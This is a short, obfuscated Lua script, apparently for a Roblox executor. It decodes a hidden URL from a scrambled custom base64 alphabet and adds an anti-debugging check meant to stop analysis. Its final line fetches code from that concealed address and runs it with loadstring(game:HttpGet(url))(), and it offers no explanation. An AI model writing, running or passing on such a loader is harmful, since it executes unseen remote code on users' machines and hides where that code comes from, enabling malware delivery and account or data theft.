local _a = {}
for _i = 1, 64 do
    local _c = _i - 1
    if _c < 26 then
        _a[_i] = string.char(122 - _c)
    elseif _c < 52 then
        _a[_i] = string.char(90 - (_c - 26))
    elseif _c < 62 then
        _a[_i] = string.char(48 + (_c - 52))
    elseif _c == 62 then
        _a[_i] = "-"
    else
        _a[_i] = "+"
    end
end

local _map = {}
for _i = 1, #_a do
    _map[_a[_i]] = _i - 1
end

local _parts = {
    {9, 8, 21, 3, 42, 7, 31, 52},
    {23, 19, 30, 29, 10, 7, 38, 28},
    {1, 5, 49, 12, 44, 33, 17, 24},
    {50, 11, 47, 6, 32, 16, 26, 36},
    {15, 43, 4, 39, 18, 27, 14, 45},
    {40, 25, 20, 53}
}
local _order = {1, 3, 2, 4, 5, 6}

local _enc = ""
for _i = 1, #_order do
    local part = _parts[_order[_i]]
    for _j = 1, #part do
        _enc = _enc .. _a[part[_j] + 1]
    end
end

local _dec = {}
for _i = 1, #_enc, 4 do
    local p1 = _map[_enc:sub(_i, _i)]
    local p2 = _map[_enc:sub(_i + 1, _i + 1)]
    local p3 = _map[_enc:sub(_i + 2, _i + 2)]
    local p4 = _map[_enc:sub(_i + 3, _i + 3)]
    local n = p1 * 262144 + p2 * 4096 + p3 * 64 + p4
    _dec[#_dec + 1] = string.char(math.floor(n / 65536) % 256)
    _dec[#_dec + 1] = string.char(math.floor(n / 256) % 256)
    _dec[#_dec + 1] = string.char(n % 256)
end
local url = table.concat(_dec)

local _guard = type(debug) == "table" and type(debug.getinfo) == "function"
if _guard then
    local _k = 0
    for _ = 1, 100000 do _k = _k + 1 end
    error(_k)
end

loadstring(game:HttpGet(url))()
